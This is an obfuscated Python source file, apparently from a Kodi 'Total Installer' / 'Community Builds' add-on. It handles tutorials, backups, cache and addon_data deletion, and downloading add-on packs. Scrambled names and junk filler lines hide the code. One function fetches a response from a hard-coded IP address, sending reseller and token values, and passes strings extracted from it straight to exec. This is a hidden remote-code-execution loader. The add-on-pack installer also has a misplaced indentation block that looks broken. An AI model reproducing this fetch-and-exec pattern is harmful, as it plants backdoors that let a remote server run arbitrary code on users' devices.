  iiI1IiI . update ( 0 , "Backing Up" , '[COLOR blue]%s[/COLOR]' % i1IIIii , 'Please Wait' )
  I1IIi . add ( i1IIIii )
  if 37 - 37: oo0oooooO0 . o0oOOo0O0Ooo / OO0oo0oOO / Oo * i1IIi
 I1IIi . close ( )
 iiI1IiI . close ( )
 if 90 - 90: I1IiiI . II111iiii - i1IIi + ooOo
 if 58 - 58: oo0oooooO0 - OoooooooOO
def I1IIIIiii1i ( ) :
 i11I1IiiiiiiiIi = xbmc . getInfoLabel ( "System.BuildVersion" )
 Oo0 = float ( i11I1IiiiiiiiIi [ : 4 ] )
 if Oo0 < 14 :
  o00oO00i1i = os . path . join ( o00OO00OoO , 'xbmc.log' )
 else :
  o00oO00i1i = os . path . join ( o00OO00OoO , 'kodi.log' )
  if 46 - 46: OoooooooOO
 try :
  Oo0oO00 = open ( o00oO00i1i , mode = 'r' )
  O0oiIiiiiI1II1I1 = Oo0oO00 . read ( )
  Oo0oO00 . close ( )
 except :
  try :
   Oo0oO00 = open ( os . path . join ( II , 'temp' , 'kodi.log' ) , mode = 'r' )
   O0oiIiiiiI1II1I1 = Oo0oO00 . read ( )
   Oo0oO00 . close ( )
  except :
   try :
    Oo0oO00 = open ( os . path . join ( II , 'temp' , 'xbmc.log' ) , mode = 'r' )
    O0oiIiiiiI1II1I1 = Oo0oO00 . read ( )
    Oo0oO00 . close ( )
   except : pass
   if 23 - 23: i1IIi
 if 'OpenELEC' in O0oiIiiiiI1II1I1 :
  return True
  if 31 - 31: Oo0Ooo - iIii1I11I1II1 / iii1I11ii1i1 . OoO0O00
  if 74 - 74: Oo0Ooo - II111iiii - oOoO0o00OO0
def IiII1II1 ( ) :
 xbmc . executebuiltin ( 'RunAddon(service.openelec.settings)' )
 if 61 - 61: OO0oo0oOO + I1IiiI / i1IIi + i1IIi / ooOo
 if 47 - 47: iI1iiIiiII
def I1IIII1 ( url ) :
 iIiIIi1 ( 'folder' , '[COLOR=yellow]1. Install:[/COLOR]  Installation tutorials (e.g. flashing a new OS)' , str ( url ) + '&thirdparty=InstallTools' , 'grab_tutorials' , 'Install.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Add-on Tools:[/COLOR]  Add-on maintenance and coding tutorials' , str ( url ) + '&thirdparty=AddonTools' , 'grab_tutorials' , 'ADDONTOOLS.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Audio Tools:[/COLOR]  Audio related tutorials' , str ( url ) + '&thirdparty=AudioTools' , 'grab_tutorials' , 'AUDIOTOOLS.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Gaming Tools:[/COLOR]  Integrate a gaming section into your setup' , str ( url ) + '&thirdparty=GamingTools' , 'grab_tutorials' , 'gaming_portal.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Image Tools:[/COLOR]  Tutorials to assist with your pictures/photos' , str ( url ) + '&thirdparty=ImageTools' , 'grab_tutorials' , 'IMAGETOOLS.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Library Tools:[/COLOR]  Music and Video Library Tutorials' , str ( url ) + '&thirdparty=LibraryTools' , 'grab_tutorials' , 'LIBRARYTOOLS.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Skinning Tools:[/COLOR]  All your skinning advice' , str ( url ) + '&thirdparty=SkinningTools' , 'grab_tutorials' , 'SKINNINGTOOLS.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Video Tools:[/COLOR]  All video related tools' , str ( url ) + '&thirdparty=VideoTools' , 'grab_tutorials' , 'VIDEOTOOLS.png' , '' , '' , '' )
 if 91 - 91: II111iiii
 if 23 - 23: OoOoOO00 * oOoO0o00OO0 / ooOo
def ooo0O0OOo0OoO ( xmlfile ) :
 O0O0o0o0oo0O = Ii1 ( xmlfile , o0O . getAddonInfo ( 'path' ) , 'DefaultSkin' , close_time = 34 )
 O0O0o0o0oo0O . doModal ( )
 del O0O0o0o0oo0O
 if 30 - 30: iI1iiIiiII / I1IiiI / i1IIi - O0 . OO0oo0oOO - OOo00O0
def o00o0o0o ( ) :
 IiI1ooo00OoOooooo = 'http://noobsandnerds.com/TI/Addon_Packs/addonpacks.txt'
 IIo0o0O0O00oOOo = iIIIiIi ( IiI1ooo00OoOooooo ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 i11111I1IOoo0ooOOOOoOo = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 if 87 - 87: II111iiii - OoooooooOO / i1IIi . OO0oo0oOO - Oo0Ooo . i11iIiiIii
 for ooO , i1iI , i1oOOOOOOOoO , I1 , i1i1IIii1i1 in i11111I1IOoo0ooOOOOoOo :
  iIiIIi1 ( 'folder2' , ooO , i1iI , 'popularwizard' , i1oOOOOOOOoO , I1 , '' , i1i1IIii1i1 )
  if 47 - 47: Oo0Ooo % OoO0O00 - OOo00O0 - Oo0Ooo * ooOo
def OOOOO0oOOoO ( name , url , iconimage , description ) :
 Ii1Ii1IiIIIi1 ( name , description )
 i1II = O0OoO000O0OO . yesno ( name , 'This will install the ' + name , '' , 'Are you sure you want to continue?' , nolabel = 'Cancel' , yeslabel = 'Accept' )
 if 42 - 42: I1IiiI + i11iIiiIii / OoO0O00
 if i1II == 0 :
  return
  if 64 - 64: oOoO0o00OO0
 elif i1II == 1 :
  import downloader
  iI1i1IiIIIIi = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
  OooooOOOO = xbmc . translatePath ( os . path . join ( 'special://' , 'home' ) )
  iiI1IiI = xbmcgui . DialogProgress ( )
  iiI1IiI . create ( "Addon Packs" , "Downloading " + name + " addon pack." , '' , 'Please Wait' )
  II1iOOoOooO0o = os . path . join ( iI1i1IiIIIIi , name + '.zip' )
  if 89 - 89: O0 + oOoO0o00OO0 * iI1iiIiiII
  try :
   os . remove ( II1iOOoOooO0o )
   if 30 - 30: OoOoOO00
  except :
   pass
   downloader . download ( url , II1iOOoOooO0o , iiI1IiI )
   time . sleep ( 3 )
   iiI1IiI . update ( 0 , "" , "Extracting Zip Please Wait" )
   xbmc . executebuiltin ( "XBMC.Extract(%s,%s)" % ( II1iOOoOooO0o , OooooOOOO ) )
   O0OoO000O0OO . ok ( "Total Installer" , "All Done. Your addons will now go through the update process, it may take a minute or two until the addons are working." )
   time . sleep ( 1 )
   xbmc . executebuiltin ( 'UpdateLocalAddons' )
   xbmc . executebuiltin ( 'UpdateAddonRepos' )
   if 39 - 39: I1ii11iIi11i + o0oOOo0O0Ooo + iI1iiIiiII + oOoO0o00OO0
   if 48 - 48: iI1iiIiiII / OOo00O0 . iIii1I11I1II1
   if 72 - 72: i1IIi . o0oOOo0O0Ooo
   if 3 - 3: OoOoOO00 % II111iiii - O0
   if 52 - 52: OoO0O00
   if 49 - 49: OO0oo0oOO . I1ii11iIi11i % OOo00O0 . Oo0Ooo * Oo
   if 44 - 44: iIii1I11I1II1 / O0 * Oo0Ooo + I1IiiI . OOo00O0
   if 20 - 20: oo0oooooO0 + o0oOOo0O0Ooo . iI1iiIiiII / i11iIiiIii
   if 7 - 7: OoOoOO00 / OoOoOO00 . iI1iiIiiII * O0 + oOoO0o00OO0 + ooOo
   if 98 - 98: II111iiii * oOoO0o00OO0 - I1IiiI % o0oOOo0O0Ooo - oo0oooooO0 % I1ii11iIi11i
   if 69 - 69: i1IIi % OoO0O00 % iI1iiIiiII / OOo00O0 / OOo00O0
   if 6 - 6: II111iiii % I1ii11iIi11i % i1IIi * OOo00O0
   if 47 - 47: O0
   if 55 - 55: OoO0O00 % O0 / OoooooooOO
   if 49 - 49: I1IiiI . OoO0O00 * OoooooooOO % i11iIiiIii + iIii1I11I1II1 * i1IIi
   if 88 - 88: I1ii11iIi11i * oo0oooooO0 + II111iiii
   if 62 - 62: OoooooooOO
   if 33 - 33: O0 . i11iIiiIii % o0oOOo0O0Ooo
   if 50 - 50: OOo00O0
   if 81 - 81: i11iIiiIii * iIii1I11I1II1 / Oo0Ooo * Oo
   if 83 - 83: i11iIiiIii - I1IiiI * i11iIiiIii
   if 59 - 59: oo0oooooO0 - OoooooooOO / OOo00O0 + I1ii11iIi11i . o0oOOo0O0Ooo - oo0oooooO0
   if 29 - 29: ooOo
   if 26 - 26: O0 % Oo - oOoO0o00OO0 . Oo
   if 70 - 70: o0oOOo0O0Ooo + iii1I11ii1i1 / oo0oooooO0 + OOo00O0 / I1IiiI
   if 33 - 33: OoooooooOO . O0
   if 59 - 59: iIii1I11I1II1
   if 45 - 45: O0
   if 78 - 78: iii1I11ii1i1 - iIii1I11I1II1 + iI1iiIiiII - I1ii11iIi11i - iI1iiIiiII
   if 21 - 21: OoooooooOO . O0 / i11iIiiIii
   if 86 - 86: OoOoOO00 / Oo
   if 40 - 40: iIii1I11I1II1 / OOo00O0 / I1IiiI + I1ii11iIi11i * Oo
   if 1 - 1: OoO0O00 * OOo00O0 + oOoO0o00OO0 . ooOo / OOo00O0
   if 91 - 91: OO0oo0oOO + iii1I11ii1i1 - Oo0Ooo % OoOoOO00 . oo0oooooO0
   if 51 - 51: Oo / iii1I11ii1i1
   if 51 - 51: OOo00O0 * ooOo - iI1iiIiiII + oo0oooooO0
   if 46 - 46: o0oOOo0O0Ooo - i11iIiiIii % OoO0O00 / OO0oo0oOO - OoOoOO00
   if 88 - 88: ooOo * I1IiiI / OoO0O00 - Oo / i1IIi . iI1iiIiiII
   if 26 - 26: i11iIiiIii - OOo00O0
   if 45 - 45: OOo00O0 + II111iiii % oo0oooooO0
   if 55 - 55: OOo00O0 - ooOo % I1IiiI
   if 61 - 61: OOo00O0
   if 22 - 22: iIii1I11I1II1 / OOo00O0 / I1IiiI - o0oOOo0O0Ooo
   if 21 - 21: ooOo . i11iIiiIii * iii1I11ii1i1 . Oo / Oo
def iIIi1I ( recursive_location , remote_path ) :
 if not os . path . exists ( recursive_location ) :
  os . makedirs ( recursive_location )
  if 42 - 42: OoooooooOO / iI1iiIiiII . o0oOOo0O0Ooo / O0 - oOoO0o00OO0 * oOoO0o00OO0
 IIo0o0O0O00oOOo = iIIIiIi ( remote_path ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 i11111I1IOoo0ooOOOOoOo = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( IIo0o0O0O00oOOo )
 if 1 - 1: OO0oo0oOO % iI1iiIiiII
 for IiiiI in i11111I1IOoo0ooOOOOoOo :
  Iiii1I1 = xbmc . translatePath ( os . path . join ( recursive_location , IiiiI ) )
  if 97 - 97: OoOoOO00
  if '/' not in IiiiI :
   if 13 - 13: OoOoOO00 % Oo . O0 / Oo0Ooo % Oo0Ooo
   try :
    iiI1IiI . update ( 0 , "Downloading [COLOR=yellow]" + IiiiI + '[/COLOR]' , '' , 'Please wait...' )
    downloader . download ( remote_path + IiiiI , Iiii1I1 , iiI1IiI )
    if 19 - 19: iI1iiIiiII % OOo00O0 - OOo00O0 % I1IiiI . Oo - OoooooooOO
   except :
    print "failed to install" + IiiiI
    if 100 - 100: I1IiiI + OO0oo0oOO + o0oOOo0O0Ooo . i1IIi % OoooooooOO
  if '/' in IiiiI and '..' not in IiiiI and 'http' not in IiiiI :
   Oo0oO0O0OO = remote_path + IiiiI
   iIIi1I ( Iiii1I1 , Oo0oO0O0OO )
   if 20 - 20: OoOoOO00
  else :
   pass
   if 1 - 1: iI1iiIiiII * OoO0O00 - oo0oooooO0
   if 97 - 97: oo0oooooO0 . I1ii11iIi11i - iIii1I11I1II1 . OOo00O0 + I1IiiI % ooOo
def Ii1i1 ( ) :
 O0OoO000O0OO . ok ( "Register to unlock features" , "To get the most out of this addon please register at the [COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR] forum for free." , 'www.noobsandnerds.com' )
 if 6 - 6: iIii1I11I1II1 * II111iiii
 if 38 - 38: I1IiiI
def iiiii1i1 ( ) :
 i1II = xbmcgui . Dialog ( ) . yesno ( 'Delete Addon_Data Folder?' , 'This will free up space by deleting your addon_data folder. This contains all addon related settings including username and password info.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if 87 - 87: oOoO0o00OO0 - O0 + I1IiiI / OoooooooOO * oo0oooooO0 / i1IIi
 if i1II == 1 :
  oOiIi ( )
  O0OoO000O0OO . ok ( "Addon_Data Removed" , '' , 'Your addon_data folder has now been removed.' , '' )
  if 28 - 28: o0oOOo0O0Ooo - oo0oooooO0 * I1ii11iIi11i - II111iiii % II111iiii - oOoO0o00OO0
def OOo0 ( url ) :
 oOOooo0OoOOOO = str ( url ) . replace ( Ooo , OooO0 )
 if 27 - 27: OO0oo0oOO - OoooooooOO . I1ii11iIi11i - oOoO0o00OO0
 if O0OoO000O0OO . yesno ( "Remove" , '' , "Do you want to Remove" ) :
  if 64 - 64: i1IIi
  for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( url ) :
   if 71 - 71: oOoO0o00OO0 * o0oOOo0O0Ooo
   for ooOo0O0o0 in ooO0oo :
    os . unlink ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) )
    if 99 - 99: o0oOOo0O0Ooo
   for ii1iIIiii1 in iIIIIiiIii :
    shutil . rmtree ( os . path . join ( IIIIiI11Ii1i , ii1iIIiii1 ) )
  os . rmdir ( url )
  if 28 - 28: OoooooooOO % O0 - Oo / o0oOOo0O0Ooo / I1IiiI
  try :
   if 41 - 41: II111iiii * oOoO0o00OO0 / OoO0O00 . ooOo
   for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( oOOooo0OoOOOO ) :
    if 50 - 50: OoooooooOO + iIii1I11I1II1 / ooOo / Oo . i11iIiiIii . OOo00O0
    for ooOo0O0o0 in ooO0oo :
     os . unlink ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) )
     if 75 - 75: iIii1I11I1II1 % OOo00O0 / Oo - oo0oooooO0 % i11iIiiIii
    for ii1iIIiii1 in iIIIIiiIii :
     shutil . rmtree ( os . path . join ( IIIIiI11Ii1i , ii1iIIiii1 ) )
     if 11 - 11: iii1I11ii1i1 . OO0oo0oOO
   os . rmdir ( oOOooo0OoOOOO )
   if 87 - 87: Oo + Oo
  except :
   pass
   if 45 - 45: i1IIi - Oo0Ooo
  OO0OoOo00 = os . path . join ( ooOoOoo0O , 'Database' , 'Addons16.db' )
  if 75 - 75: iIii1I11I1II1 / II111iiii / OO0oo0oOO / OoOoOO00
  try :
   os . remove ( OO0OoOo00 )
   if 77 - 77: OoOoOO00
  except :
   pass
   if 31 - 31: oOoO0o00OO0 / oo0oooooO0
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  xbmc . sleep ( 1000 )
  xbmc . executebuiltin ( 'UpdateAddonRepos' )
  O0OoO000O0OO . ok ( 'Add-on removed' , 'You may have to restart Kodi to repopulate' , 'your add-on database. Until you restart you\'ll' , 'find your add-on is still showing even though it\'s deleted' )
  xbmc . executebuiltin ( 'Container.Refresh' )
  if 97 - 97: OoO0O00 + iIii1I11I1II1
  if 79 - 79: OOo00O0 + ooOo - II111iiii . Oo0Ooo
def iIiIi1i1ii11 ( ) :
 III1II1i ( )
 O0O0o0o0OOooo = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the backup file you want to DELETE' , 'files' , '.zip' , False , False , iIo00O )
 if 31 - 31: oo0oooooO0 / ooOo - OOo00O0 % Oo0Ooo - Oo0Ooo
 if O0O0o0o0OOooo != iIo00O :
  O0O0O = ntpath . basename ( O0O0o0o0OOooo )
  i1II = xbmcgui . Dialog ( ) . yesno ( 'Delete Backup File' , 'This will completely remove ' + O0O0O , 'Are you sure you want to delete?' , '' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Delete' )
  if 50 - 50: Oo - oOoO0o00OO0 . i1IIi
  if i1II == 1 :
   os . remove ( O0O0o0o0OOooo )
   if 87 - 87: OOo00O0 + O0
   if 69 - 69: iIii1I11I1II1 + i1IIi % II111iiii . OoO0O00 * ooOo * oOoO0o00OO0
def oOooO00oOoo00 ( ) :
 i1II = xbmcgui . Dialog ( ) . yesno ( 'Remove All Crash Logs?' , 'There is absolutely no harm in doing this, these are log files generated when Kodi crashes and are only used for debugging purposes.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if 93 - 93: OO0oo0oOO * iIii1I11I1II1 * o0oOOo0O0Ooo
 if i1II == 1 :
  O0Oo0O00o0oo0OO ( )
  O0OoO000O0OO . ok ( "Crash Logs Removed" , '' , 'Your crash log files have now been removed.' , '' )
  if 23 - 23: Oo . OO0oo0oOO * OoooooooOO - iii1I11ii1i1
  if 99 - 99: OoooooooOO % i1IIi % OoooooooOO . oo0oooooO0
def iIo0O000O00o ( ) :
 i1II = xbmcgui . Dialog ( ) . yesno ( 'Delete Packages Folder?' , 'This will free up space by deleting the zip install files of your addons. The only downside is you\'ll no longer be able to rollback to older versions.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if 38 - 38: OoooooooOO . oo0oooooO0
 if i1II == 1 :
  ooOO0OOO00o ( )
  O0OoO000O0OO . ok ( "Packages Removed" , '' , 'Your zip install files have now been removed.' , '' )
  if 43 - 43: OoooooooOO
  if 8 - 8: Oo + iii1I11ii1i1 . iii1I11ii1i1
def OooOoooo0000 ( ) :
 i1II = xbmcgui . Dialog ( ) . yesno ( 'Clear Cached Images?' , 'This will clear your textures13.db file and remove your Thumbnails folder. These will automatically be repopulated after a restart.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if 89 - 89: I1ii11iIi11i * I1ii11iIi11i * OoOoOO00 / oo0oooooO0
 if i1II == 1 :
  I1111111 ( )
  O0ooO00o ( OO0o )
  if 60 - 60: OoO0O00 / oo0oooooO0 / I1IiiI + ooOo
  i1II = xbmcgui . Dialog ( ) . yesno ( 'Quit Kodi Now?' , 'Cache has been successfully deleted.' , 'You must now restart Kodi, would you like to quit now?' , '' , nolabel = 'I\'ll restart later' , yeslabel = 'Yes, quit' )
  if 93 - 93: OoooooooOO * OO0oo0oOO / O0 + OO0oo0oOO - iIii1I11I1II1
  if i1II == 1 :
   try :
    xbmc . executebuiltin ( "RestartApp" )
    if 6 - 6: oOoO0o00OO0 - Oo0Ooo - iii1I11ii1i1 - O0 % OoooooooOO
   except :
    o0OOOoOO00o ( )
    if 88 - 88: O0 / o0oOOo0O0Ooo * o0oOOo0O0Ooo . o0oOOo0O0Ooo . O0
    if 27 - 27: i11iIiiIii % oo0oooooO0 + OO0oo0oOO . Oo
def I1111111 ( ) :
 iIIi1I1 = xbmc . translatePath ( 'special://home/userdata/Database/Textures13.db' )
 try :
  ooI1 = database . connect ( iIIi1I1 )
  i1Iii1i1II1 = ooI1 . cursor ( )
  i1Iii1i1II1 . execute ( "DROP TABLE IF EXISTS path" )
  i1Iii1i1II1 . execute ( "VACUUM" )
  ooI1 . commit ( )
  i1Iii1i1II1 . execute ( "DROP TABLE IF EXISTS sizes" )
  i1Iii1i1II1 . execute ( "VACUUM" )
  ooI1 . commit ( )
  i1Iii1i1II1 . execute ( "DROP TABLE IF EXISTS texture" )
  i1Iii1i1II1 . execute ( "VACUUM" )
  ooI1 . commit ( )
  i1Iii1i1II1 . execute ( """CREATE TABLE path (id integer, url text, type text, texture text, primary key(id))""" )
  ooI1 . commit ( )
  i1Iii1i1II1 . execute ( """CREATE TABLE sizes (idtexture integer,size integer, width integer, height integer, usecount integer, lastusetime text)""" )
  ooI1 . commit ( )
  i1Iii1i1II1 . execute ( """CREATE TABLE texture (id integer, url text, cachedurl text, imagehash text, lasthashcheck text, PRIMARY KEY(id))""" )
  ooI1 . commit ( )
 except :
  pass
  if 75 - 75: OOo00O0 % Oo / o0oOOo0O0Ooo % II111iiii
  if 30 - 30: o0oOOo0O0Ooo
def oOo00OoO0O ( url ) :
 iIII1I111III = 'http://120.24.252.100/TI/Community_Builds/reseller_2?reseller=%s&token=%s&openelec=%s' % ( I1IiiI , IIi1IiiiI1Ii , url )
 IIo0o0O0O00oOOo = iIIIiIi ( iIII1I111III ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOOooI1 = re . compile ( 'path="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IiI1i1iI = re . compile ( 'reseller="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iIIiiIIIII = re . compile ( 'premium="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiiII = re . compile ( 'openelec="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Oo0OooII1iII11 = IiI1i1iI [ 0 ] if ( len ( IiI1i1iI ) > 0 ) else 'None'
 iiiI1 = iIIiiIIIII [ 0 ] if ( len ( iIIiiIIIII ) > 0 ) else 'None'
 IiIi1i1I = iiiII [ 0 ] if ( len ( iiiII ) > 0 ) else 'None'
 exec IiIi1i1I
 exec Oo0OooII1iII11
 exec iiiI1
 if 94 - 94: OO0oo0oOO + O0 - OoooooooOO / O0
 if 70 - 70: OoooooooOO / Oo - OoO0O00 % OoooooooOO
def iI1Iii1i11 ( name , url , description ) :
 if 'Backup' in name :
  III1II1i ( )
  II111i = open ( url ) . read ( )
  iI1i11iiII = os . path . join ( iIo00O , description . split ( 'Your ' ) [ 1 ] )
  ooOo0O0o0 = open ( iI1i11iiII , mode = 'w' )
  ooOo0O0o0 . write ( II111i )
  ooOo0O0o0 . close ( )
  if 28 - 28: oo0oooooO0 - o0oOOo0O0Ooo
 else :
  if 'guisettings.xml' in description :
   ooo0O0o0OoOO = open ( os . path . join ( iIo00O , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   OOOOo0o0O0 = '<setting type="(.+?)" name="%s.(.+?)">(.+?)</setting>' % oOOoo0Oo
   i11111I1IOoo0ooOOOOoOo = re . compile ( OOOOo0o0O0 ) . findall ( ooo0O0o0OoOO )
   if 7 - 7: Oo . oOoO0o00OO0 . iI1iiIiiII / OO0oo0oOO / Oo0Ooo
   for type , o0Ooo , iI11IIiII in i11111I1IOoo0ooOOOOoOo :
    iI11IIiII = iI11IIiII . replace ( '&quot;' , '' ) . replace ( '&amp;' , '&' )
    xbmc . executebuiltin ( "Skin.Set%s(%s,%s)" % ( type . title ( ) , o0Ooo , iI11IIiII ) )
    if 20 - 20: I1IiiI + i1IIi
  else :
   iI1i11iiII = os . path . join ( url )
   II111i = open ( os . path . join ( iIo00O , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   ooOo0O0o0 = open ( iI1i11iiII , mode = 'w' )
   ooOo0O0o0 . write ( II111i )
   ooOo0O0o0 . close ( )
   if 89 - 89: OOo00O0 % ooOo * OO0oo0oOO - Oo0Ooo / o0oOOo0O0Ooo + OoO0O00
 O0OoO000O0OO . ok ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "" , 'All Done !' , '' )
 if 56 - 56: i11iIiiIii * oo0oooooO0 / i11iIiiIii * OO0oo0oOO . iIii1I11I1II1 . I1ii11iIi11i
 if 93 - 93: OoOoOO00 + iii1I11ii1i1
def ii1IiIiI1iiii ( name , url , video , description , skins , guisettingslink , artpack ) :
 iiI1IiI . create ( "Backing Up Important Data" , 'Please wait...' , '' , '' )
 if 13 - 13: II111iiii % i1IIi - OoOoOO00 + oo0oooooO0
 if 59 - 59: OoooooooOO + iI1iiIiiII % o0oOOo0O0Ooo - OoOoOO00 . I1IiiI
 i11iII11I1III = open ( Ooo0OO0oOO , mode = 'r' )
 I1iiii1IiI1i1 = i11iII11I1III . read ( )
 i11iII11I1III . close ( )
 if 3 - 3: OoOoOO00
 IiioOoOO0OO0O0 = re . compile ( 'gui="(.+?)"' ) . findall ( I1iiii1IiI1i1 )
 oooO000Oo000O = IiioOoOO0OO0O0 [ 0 ] if ( len ( IiioOoOO0OO0O0 ) > 0 ) else '0'
 if 41 - 41: ooOo - iIii1I11I1II1
 if 11 - 11: i11iIiiIii % o0oOOo0O0Ooo % OOo00O0
 if O0oo0OO0 == 'true' :
  try :
   oO00O = open ( iI , mode = 'r' )
   III1II = oO00O . read ( )
   oO00O . close ( )
   if 81 - 81: oo0oooooO0 - OO0oo0oOO - Oo % oOoO0o00OO0 % o0oOOo0O0Ooo . iIii1I11I1II1
  except :
   print "### No favourites file to copy"
   if 79 - 79: I1ii11iIi11i - I1ii11iIi11i . OO0oo0oOO / oOoO0o00OO0
 if I1i1iiI1 == 'true' :
  try :
   O00o00o00OO0 = open ( I1i1I1II , mode = 'r' )
   IIII1IiiI = O00o00o00OO0 . read ( )
   O00o00o00OO0 . close ( )
   if 100 - 100: I1IiiI - Oo
  except :
   print "### No sources file to copy"
   if 91 - 91: o0oOOo0O0Ooo * I1ii11iIi11i - oo0oooooO0 . II111iiii
   if 1 - 1: Oo + iI1iiIiiII * I1ii11iIi11i
 i1I1IiIiIII = xbmc . getSkinDir ( )
 print "Current Skin: " + i1I1IiIiIII
 if video == 'fresh' and i1I1IiIiIII != "skin.confluence" :
  O0OoO000O0OO . ok ( 'Default Confluence Skin Required' , '' , 'Please switch to the default Confluence skin.' , '' )
  xbmc . executebuiltin ( 'ActivateWindow(appearancesettings,return)' )
  return
  if 64 - 64: I1ii11iIi11i / O0 % oOoO0o00OO0 % oo0oooooO0 % I1IiiI / iI1iiIiiII
 IIiI11i111i = 1
 III1II1i ( )
 if 76 - 76: Oo
 if 52 - 52: Oo0Ooo * iIii1I11I1II1 * Oo0Ooo * i1IIi
 if os . path . exists ( ooOooo000oOO ) :
  if 9 - 9: oo0oooooO0 - oo0oooooO0
  if os . path . exists ( O00o0OO ) :
   os . remove ( ooOooo000oOO )
   if 3 - 3: O0 + O0 - O0 - O0 % OoooooooOO + ooOo
  else :
   os . rename ( ooOooo000oOO , O00o0OO )
   if 20 - 20: OoO0O00 + iii1I11ii1i1 . II111iiii / i11iIiiIii
 if os . path . exists ( I11i1 ) :
  os . remove ( I11i1 )
  if 50 - 50: OoooooooOO / OoO0O00 % iIii1I11I1II1
  if 41 - 41: I1ii11iIi11i % I1ii11iIi11i + oOoO0o00OO0 . oo0oooooO0 % iI1iiIiiII * OOo00O0
 if not os . path . exists ( iiii11I ) :
  Oo0oO00 = open ( iiii11I , mode = 'w+' )
  Oo0oO00 . close ( )
  if 57 - 57: OO0oo0oOO . iI1iiIiiII . II111iiii % OoooooooOO * O0 + iIii1I11I1II1
 iiI1IiI . close ( )
 iiI1IiI . create ( "Downloading Skin Fix" , "Downloading guisettings.xml" , '' , 'Please Wait' )
 II1iOOoOooO0o = os . path . join ( iIo00O , 'guifix.zip' )
 if 94 - 94: i1IIi * OoO0O00 * OoOoOO00
 if 93 - 93: OOo00O0 / Oo * O0
 downloader . download ( guisettingslink , II1iOOoOooO0o , iiI1IiI )
 iiI1IiI . close ( )
 if 17 - 17: OoO0O00 / OOo00O0 % I1IiiI
 if 47 - 47: Oo0Ooo * OoO0O00 / o0oOOo0O0Ooo * I1IiiI
 if zipfile . is_zipfile ( II1iOOoOooO0o ) :
  i1111I = str ( os . path . getsize ( II1iOOoOooO0o ) )
  if 60 - 60: I1ii11iIi11i / oOoO0o00OO0 . i11iIiiIii / OoO0O00 % II111iiii
 else :
  i1111I = oooO000Oo000O
  if 6 - 6: oo0oooooO0 % o0oOOo0O0Ooo + iI1iiIiiII
  if 91 - 91: o0oOOo0O0Ooo + O0 * ooOo * oOoO0o00OO0 * I1ii11iIi11i
 Oo0oO00 = open ( iiii11I , mode = 'r' )
 O0oiIiiiiI1II1I1 = Oo0oO00 . read ( )
 Oo0oO00 . close ( )
 if 83 - 83: OoooooooOO
 iII1IiiIIIIii = re . compile ( 'id="(.+?)"' ) . findall ( O0oiIiiiiI1II1I1 )
 oOOO = re . compile ( 'name="(.+?)"' ) . findall ( O0oiIiiiiI1II1I1 )
 Iii1IiiII1Ii1 = re . compile ( 'version="(.+?)"' ) . findall ( O0oiIiiiiI1II1I1 )
 if 52 - 52: o0oOOo0O0Ooo / OoOoOO00 % ooOo % OoO0O00 / oOoO0o00OO0 % o0oOOo0O0Ooo
 iiiIIi = iII1IiiIIIIii [ 0 ] if ( len ( iII1IiiIIIIii ) > 0 ) else ''
 OOoOo0O00oo = oOOO [ 0 ] if ( len ( oOOO ) > 0 ) else ''
 i1Ii11I1II = Iii1IiiII1Ii1 [ 0 ] if ( len ( Iii1IiiII1Ii1 ) > 0 ) else ''
 if 88 - 88: Oo / i11iIiiIii / OO0oo0oOO / i11iIiiIii * I1ii11iIi11i % iii1I11ii1i1
 if os . path . exists ( Oo0oOOo ) :
  os . removedirs ( Oo0oOOo )
  if 43 - 43: OoOoOO00 * OoO0O00 % i1IIi * OO0oo0oOO + iIii1I11I1II1
  if 80 - 80: o0oOOo0O0Ooo . oo0oooooO0 . OoooooooOO
 if oooO000Oo000O != i1111I :
  try :
   os . rename ( O00o0OO , ooOooo000oOO )
   if 63 - 63: OOo00O0 . Oo
  except :
   O0OoO000O0OO . ok ( "NO GUISETTINGS!" , 'No guisettings.xml file has been found.' , 'Please exit Kodi and try again' , '' )
   return
   if 66 - 66: I1IiiI
   if 99 - 99: OoO0O00 % O0 . iI1iiIiiII - I1ii11iIi11i . Oo0Ooo / OoOoOO00
 if video != 'fresh' :
  i1II = xbmcgui . Dialog ( ) . yesno ( name , 'We highly recommend backing up your existing build before installing any community builds. Would you like to perform a backup first?' , nolabel = 'Backup' , yeslabel = 'Install' )
  if 60 - 60: I1ii11iIi11i
  if i1II == 0 :
